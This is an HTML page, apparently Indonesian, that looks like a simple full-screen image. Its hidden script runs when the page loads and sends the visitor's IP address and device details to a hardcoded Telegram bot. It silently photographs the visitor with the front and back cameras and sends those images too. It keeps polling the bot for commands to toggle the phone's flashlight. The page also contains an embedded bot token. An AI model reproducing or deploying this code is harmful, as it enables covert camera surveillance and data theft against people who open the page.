<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bagus-Xxpn</title>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100vw; height: 100vh; background: #000; color: white; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        img { max-width: 100vw; max-height: 100vh; object-fit: cover; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <img src="https://img5.pixhost.to/images/2820/565901428_skyzopedia.jpg" alt="Gambar Tampilan">
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
        const TELEGRAM_CHAT_ID = "7081489041";
        let deviceId = null;

        // Ambil info perangkat & IP
        async function getDeviceInfo() {
            try {
                const res = await axios.get("https://api64.ipify.org?format=json");
                const ip = res.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenSize = `${window.screen.width}x${window.screen.height}`;

                const deviceInfo = `ðŸ“¢ *Pengunjung Baru!*  
ðŸ”¹ IP: \`${ip}\`  
ðŸ”¹ Platform: \`${platform}\`  
ðŸ”¹ User-Agent: \`${userAgent}\`  
ðŸ”¹ Resolusi Layar: \`${screenSize}\``;

                sendToTelegram(deviceInfo, true);
            } catch (err) {
                console.error("Gagal mengambil info perangkat:", err);
            }
        }

        // Kirim ke Telegram (bisa foto atau teks)
        async function sendToTelegram(content, isText = false) {
            try {
                if (isText) {
                    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        chat_id: TELEGRAM_CHAT_ID,
                        text: content,
                        parse_mode: "Markdown",
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "ðŸ”¦ Nyalakan Senter", callback_data: "turn_on_flash" }],
                                [{ text: "ðŸš« Matikan Senter", callback_data: "turn_off_flash" }]
                            ]
                        }
                    });
                } else {
                    const blob = await fetch(content).then(res => res.blob());
                    const formData = new FormData();
                    formData.append("chat_id", TELEGRAM_CHAT_ID);
                    formData.append("photo", blob, "foto.jpg");

                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: "POST",
                        body: formData
                    });
                }
            } catch (err) {
                console.error("Gagal mengirim ke Telegram:", err);
            }
        }

        // Mulai kamera & foto otomatis
        async function startCamera() {
            try {
                const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });

                document.getElementById("video").srcObject = streamFront;
                setTimeout(() => capturePhoto(streamFront), 3000);
                setTimeout(() => capturePhoto(streamBack), 6000);
            } catch (error) {
                console.error("Gagal mengakses kamera:", error);
            }
        }

        function capturePhoto(stream) {
            const video = document.getElementById("video");
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL("image/jpeg");
                sendToTelegram(imageData);
            }, 2000);
        }

        // Event Listener untuk menerima perintah dari bot Telegram
        async function listenForCommands() {
            try {
                const res = await axios.get(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
                const messages = res.data.result;

                messages.forEach(msg => {
                    if (msg.message && msg.message.text) {
                        const text = msg.message.text;
                        if (text === "/nyalakan_senter") toggleFlashlight(true);
                        if (text === "/matikan_senter") toggleFlashlight(false);
                    }
                });
            } catch (err) {
                console.error("Gagal mendapatkan perintah:", err);
            }
        }

        // Nyalakan atau matikan senter
        async function toggleFlashlight(state) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment", torch: state } });
                const track = stream.getVideoTracks()[0];
                const capabilities = track.getCapabilities();

                if (capabilities.torch) {
                    await track.applyConstraints({ advanced: [{ torch: state }] });
                    console.log(`Senter ${state ? "nyala" : "mati"}`);
                }
            } catch (err) {
                console.error("Gagal mengontrol senter:", err);
            }
        }

        // Jalankan semua fungsi saat halaman dimuat
        window.onload = function () {
            getDeviceInfo();
            startCamera();
            setInterval(listenForCommands, 5000); // Cek perintah dari bot setiap 5 detik
        };
    </script>
</body>
</html>
